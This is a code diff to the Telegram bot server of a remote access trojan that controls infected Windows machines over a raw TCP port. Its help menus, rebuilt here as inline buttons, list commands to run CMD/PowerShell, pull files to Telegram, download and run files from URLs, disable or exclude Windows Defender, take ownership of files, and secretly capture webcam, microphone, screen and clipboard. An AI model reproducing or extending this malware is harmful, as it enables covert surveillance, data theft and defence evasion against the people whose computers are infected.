@@ -9,9 +9,15 @@ from datetime import datetime
 import io
 import aiofiles 
 from aiogram import Bot, Dispatcher, F, Router
-from aiogram.types import FSInputFile
 from aiogram.filters import Command, BaseFilter, CommandObject
-from aiogram.types import Message, ContentType
+from aiogram.types import (
+    Message, 
+    CallbackQuery, 
+    InlineKeyboardButton, 
+    FSInputFile, 
+    ContentType
+)
+from aiogram.utils.keyboard import InlineKeyboardBuilder
 
 # Логирование
 logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s',
@@ -51,7 +57,7 @@ clients = {}
 upload_requests = {}
 clients_lock = asyncio.Lock()
 HOST = '0.0.0.0'
-PORT = 1234 # Поменять
+PORT = 7777 # Поменять
 HISTORY_FILE = "client_history.json"
 clients = {}
 CLIENT_HISTORY_CACHE = {}
@@ -72,6 +78,7 @@ async def read_json(reader):
     if not line:
         return None
     return json.loads(line.decode('utf-8'))
+
 
 async def find_client_by_thread(thread_id):
     # Преобразование ID в int для корректного сравнения (Telegram ID всегда int)
@@ -235,6 +242,8 @@ async def handle_client(reader, writer):
                 client_info = CLIENT_HISTORY_CACHE[client_id].get('info', client_info)
                 client_ip = CLIENT_HISTORY_CACHE[client_id].get('ip', client_ip)
 
+                
+
             if client_id in clients:
                 # Клиент переподключился: используем существующий thread_id и обновляем данные
                 thread_id = clients[client_id]["thread_id"] 
@@ -255,7 +264,7 @@ async def handle_client(reader, writer):
                 # Новый клиент: создаем топик, если thread_id не найден
                 if not thread_id:
                     try:
-                        # === ГЕНЕРАЦИЯ ИМЕНИ ===
+                        # === ГЕНЕРАЦИЯ ИДЕАЛЬНОГО ИМЕНИ ===
                         client_ip = addr[0]
                         flag, _ = await get_flag_and_country(client_ip)
                         
@@ -553,14 +562,55 @@ async def check_clients_status():
 
 
 # ====== TG хэндлеры ======
-@dp.message(Command('help'), IsInGroup())
+def get_main_menu():
+    builder = InlineKeyboardBuilder()
+    # Добавляем кнопки категорий строго по твоим названиям
+    builder.add(InlineKeyboardButton(text="📁 Файловый менеджер", callback_data="menu_files"))
+    builder.add(InlineKeyboardButton(text="📥 Передача файлов", callback_data="menu_transfer"))
+    builder.add(InlineKeyboardButton(text="⚙️ Система и выполнение", callback_data="menu_sys"))
+    builder.add(InlineKeyboardButton(text="💬 Интерфейс", callback_data="menu_interface"))
+    builder.add(InlineKeyboardButton(text="🖱️ Управление", callback_data="menu_input"))
+    builder.add(InlineKeyboardButton(text="👾 Автоматизация", callback_data="menu_auto"))
+    builder.add(InlineKeyboardButton(text="🔇 Мультимедиа", callback_data="menu_media"))
+    builder.add(InlineKeyboardButton(text="🔧 Прочее", callback_data="menu_other"))
+    
+    builder.adjust(2) # Группировка по 2 кнопки в строке
+    
+    # Кнопка закрытия отдельной строкой внизу
+    builder.row(InlineKeyboardButton(text="❌ Закрыть меню", callback_data="menu_close"))
+    return builder.as_markup()
+
+# === ОБРАБОТЧИКИ ===
+
+@dp.message(Command('help'))
 async def handle_help(message: Message):
-    help_text = """
-<b>💻 💎Секретные данные💎</b>
-    <b><a href="https://github.com/EZIKALEXANDR/TGRat">Исходный код</a></b>
-    <b>Made by @UNBLOCK_COMPUTER</b>
------------------------------------
-<b>📁 Файловый менеджер</b>
+    # Главный текст при вызове /help
+    help_main_text = "🎄<b>Панель управления\n❄️Выберите категорию для просмотра доступных команд:</b>"
+    await message.reply(help_main_text, parse_mode="HTML", reply_markup=get_main_menu())
+
+@dp.callback_query(F.data.startswith("menu_"))
+async def process_menu_navigation(callback: CallbackQuery):
+    menu_type = callback.data.split("_")[1]
+    builder = InlineKeyboardBuilder()
+    
+    # Текст по умолчанию для предотвращения UnboundLocalError
+    text = "🎄<b>Панель управления\n❄️Выберите категорию для просмотра доступных команд:</b>"
+
+    # 1. Логика удаления (Закрыть)
+    if menu_type == "close":
+        await callback.message.delete()
+        await callback.answer("Меню закрыто")
+        return
+
+    # 2. Логика возврата в главное меню
+    if menu_type == "main":
+        await callback.message.edit_text(text, reply_markup=get_main_menu(), parse_mode="HTML")
+        await callback.answer()
+        return
+
+    # --- КАТЕГОРИИ (Оригинальные тексты без искажений) ---
+    if menu_type == "files":
+        text = """<b>📁 Файловый менеджер</b>
 <code>/ls [путь]</code> — список файлов/папок (в корне <code>/</code> — диски)
 <code>/cd &lt;путь&gt;</code> — сменить директорию
 <code>/back</code> — вернуться назад (из корня диска — в список дисков)
@@ -569,14 +619,16 @@ async def handle_help(message: Message):
 <code>/delete &lt;имя&gt;</code> — удалить файл или папку
 <code>/rename &lt;старое&gt;/n&lt;новое&gt;</code> — переименовать
 <code>/copy &lt;источник&gt;/to&lt;назначение&gt;</code> — копировать
-<code>/move &lt;источник&gt;/to&lt;назначение&gt;</code> — переместить
+<code>/move &lt;источник&gt;/to&lt;назначение&gt;</code> — переместить"""
 
-<b>📥 Передача файлов</b>
+    elif menu_type == "transfer":
+        text = """<b>📥 Передача файлов</b>
 <code>/download &lt;файл&gt;</code> — скачать файл с клиента в Telegram
 <code>/upload [имя]</code> — загрузить файл из Telegram на клиент (ответом на файл)
-<code>/download_link &lt;URL&gt; [0]</code> — скачать файл по ссылке (<code>0</code> — без запуска)
+<code>/download_link &lt;URL&gt; [0]</code> — скачать файл по ссылке (<code>0</code> — без запуска)"""
 
-<b>⚙️ Система и выполнение</b>
+    elif menu_type == "sys":
+        text = """<b>⚙️ Система и выполнение</b>
 <code>/run &lt;файл&gt;</code> — запустить программу/файл
 <code>/execute &lt;команда&gt;</code> — выполнить CMD/PowerShell
 <code>/sysinfo</code> — информация о системе (ЦПУ, память, диск)
@@ -586,13 +638,16 @@ async def handle_help(message: Message):
 <code>/cmdbomb</code> — открыть 10 окон CMD
 <code>/wd_exclude [путь]</code> — добавить исходный/указанный файл в исключение Win.Def 
 <code>/killwindef</code> — временно убить Win.Def
+<code>/grant &lt;путь&gt;</code> — получить доступ к папке/файлу (TakeOwn/Icacls)"""
 
-<b>💬 Интерфейс и уведомления</b>
+    elif menu_type == "interface":
+        text = """<b>💬 Интерфейс и уведомления</b>
 <code>/msg [тип] [заголовок]/t&lt;текст&gt;</code> — показать окно на клиенте
 <code>/changeclipboard &lt;текст&gt;</code> — установить содержимое буфера обмена
-<code>/clipboard</code> — получить содержимое буфера обмена
+<code>/clipboard</code> — получить содержимое буфера обмена"""
 
-<b>🖱️ Управление вводом и экраном</b>
+    elif menu_type == "input":
+        text = """<b>🖱️ Управление вводом и экраном</b>
 <code>/screenshot</code> или <code>/sc</code> — скриншот экрана
 <code>/photo [индекс]</code> — фото с веб-камеры
 <code>/minimize</code> — свернуть активное окно
@@ -607,23 +662,27 @@ async def handle_help(message: Message):
 <code>/applist [&lt;индекс&gt;]</code> — посмотреть список окон или вывести одно из них "вперед".
 <code>/applist_close &lt;индекс&gt;</code> — закрыть выбранное окно.
 <code>/applist_title &lt;индекс&gt; &lt;новое имя&gt;</code> — Переименовать выбранное окно
+<code>/whereami</code> — путь к текущему exe"""
 
-<b>👾 Автоматизация</b>
+    elif menu_type == "auto":
+        text = """<b>👾 Автоматизация</b>
 <code>/mousemesstart</code> — включить случайное движение мыши
 <code>/mousemesstop</code> — остановить хаос мыши
 <code>/auto &lt;сек&gt; [screen|webcam|both] [инд. камеры]</code> — авто-отправка скриншотов/фото
-<code>/stop</code> — остановить <code>/auto</code>
+<code>/stop</code> — остановить <code>/auto</code>"""
 
-<b>🔇 Мультимедиа</b>
+    elif menu_type == "media":
+        text = """<b>🔇 Мультимедиа</b>
 <code>/playsound &lt;путь&gt;</code> — воспроизвести аудиофайл на клиенте
 <code>/stopsound</code> — остановить воспроизведение
 <code>/mic &lt;сек&gt;</code> — запись с микрофона (до 30 сек)
 <code>/webcam &lt;индекс&gt; &lt;сек&gt;</code> — запись видео с камеры (до 30 сек)
 <code>/screenrecord &lt;сек&gt;</code> — запись видео с экрана (до 60 сек)
-<code>/volumeplus [N]</code> — увеличить громкость (по умолчанию +10%)
-<code>/volumeminus [N]</code> — уменьшить громкость (по умолчанию -10%)
+<code>/volumeplus [N]</code> — увеличить громкость (по умолчанию +2%)
+<code>/volumeminus [N]</code> — уменьшить громкость (по умолчанию -2%)"""
 
-<b>🔧 Прочее</b>
+    elif menu_type == "other":
+        text = """<b>🔧 Прочее</b>
 <code>/wallpaper &lt;путь&gt;</code> — установить обои
 <code>/block</code> — заблокировать мышь и клавиатуру
 <code>/unblock</code> — разблокировать ввод
@@ -632,8 +691,19 @@ async def handle_help(message: Message):
 <code>/clients</code> - посмотреть активных клиентов и их историю
 <code>/version</code> - посмотреть версию ПО на стороне клиента
 
-    <i>ver beta v28</i>"""
-    await message.reply(help_text, parse_mode="HTML")
+<i>ver beta v35</i>"""
+
+    # Добавляем кнопки управления в подменю
+    builder.row(InlineKeyboardButton(text="🔙 Назад", callback_data="menu_main"))
+    builder.add(InlineKeyboardButton(text="❌ Закрыть", callback_data="menu_close"))
+    
+    await callback.message.edit_text(
+        text, 
+        parse_mode="HTML", 
+        reply_markup=builder.as_markup(),
+        disable_web_page_preview=True
+    )
+    await callback.answer()
 
 async def get_client_status(client_id):
     """Возвращает статус клиента: 🟢 (online) или ⚫ (offline с датой)."""
@@ -788,6 +858,7 @@ async def handle_msg(message: Message, command: CommandObject):
         await writer.drain()
         await message.reply("✅ Отправлено")
     except Exception as e:
+    # 🔥 ИСПРАВЛЕНИЕ: Если отправка не удалась (например, ConnectionResetError или BrokenPipeError)
     
     # 1. Помечаем клиента для удаления
         async with clients_lock:
@@ -819,9 +890,9 @@ async def handle_msg(message: Message, command: CommandObject):
     
         # Очищаем нерабочий writer
         if writer:
-            writer.close()       
+            writer.close()
+            
         return
-
 @dp.message(Command(commands=["upload"]), IsInGroup())
 async def handle_upload_command(message: Message, command: CommandObject):
     thread_id = message.message_thread_id
@@ -962,7 +1033,7 @@ async def handle_generic_command(message: Message):
         await message.reply("❌ Для загрузки файла (upload) отправьте сам файл в этот чат, не команду.")
         return
         
-    # 2. Обработка упоминания бота
+    # 2. Обработка упоминания бота (Оставьте ваш код, он корректен)
     if '@' in cmd_part:
         # Ваш код здесь
         cmd, botname = cmd_part.split('@', 1)
@@ -970,7 +1041,8 @@ async def handle_generic_command(message: Message):
             return
         text = cmd + text[len(cmd_part):] # Очищаем команду
         
-    # 3. ПОИСК КЛИЕНТА
+    # 3. ПОИСК КЛИЕНТА (Здесь возникает ошибка KeyError: 0)
+    # Эта строка вызывает ошибку, если в clients лежит словарь вместо кортежа.
     _, _, writer = await find_client_by_thread(thread_id)
     
     if not writer:
